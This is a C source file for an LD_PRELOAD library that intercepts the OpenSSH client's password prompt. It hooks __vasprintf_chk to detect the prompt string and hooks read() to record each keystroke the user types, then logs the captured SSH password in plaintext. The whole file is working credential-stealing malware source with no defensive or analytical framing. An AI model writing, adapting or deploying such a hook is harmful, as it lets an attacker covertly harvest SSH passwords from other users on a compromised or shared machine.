#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

#include "logger/log.h"

#define PASSWORD_READ_DETECTED 1
#define PASSWORD_READ_FMT "%s@%s's password: "
#define PASSWORD_MAX_LEN 1024

#define LOG_LEVEL LOG_INFO

int password_read_detected = 0;
char password[PASSWORD_MAX_LEN];
char *cur = NULL;

// password reading detection
int __vasprintf_chk(char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg)
{
    log_trace("__vasprintf_chk() hooked");
    if (0 == strcmp(__fmt, PASSWORD_READ_FMT))
    {
        log_info("password reading detected");
        password_read_detected = PASSWORD_READ_DETECTED;
        cur = password;
    }
    int (*__vasprintf_chk_libc)(char **__restrict __ptr, int __flag, const char *__restrict __fmt, __gnuc_va_list __arg);
    __vasprintf_chk_libc = dlsym(RTLD_NEXT, "__vasprintf_chk");
    return __vasprintf_chk_libc(__ptr, __flag, __fmt, __arg);
}

// password reading
ssize_t read(int __fd, void *__buf, size_t __nbytes)
{
    log_trace("read() hooked");
    ssize_t (*read_libc)(int __fd, const void *__buf, size_t __nbytes);
    ssize_t result;
    read_libc = dlsym(RTLD_NEXT, "read");
    result = read_libc(__fd, __buf, __nbytes);
    if (PASSWORD_READ_DETECTED == password_read_detected)
    {
        if ('\n' == *(char *)__buf)
        {
            *cur = '\0';
            log_info("password: %s", password);
            password_read_detected = 0;
        }
        else
        {
            *cur = *(char *)__buf;
            cur++;
        }
    }
    return result;
}

// constructor
void __attribute__((constructor)) init(void)
{
    log_trace("init() called");
    log_set_level(LOG_LEVEL);
}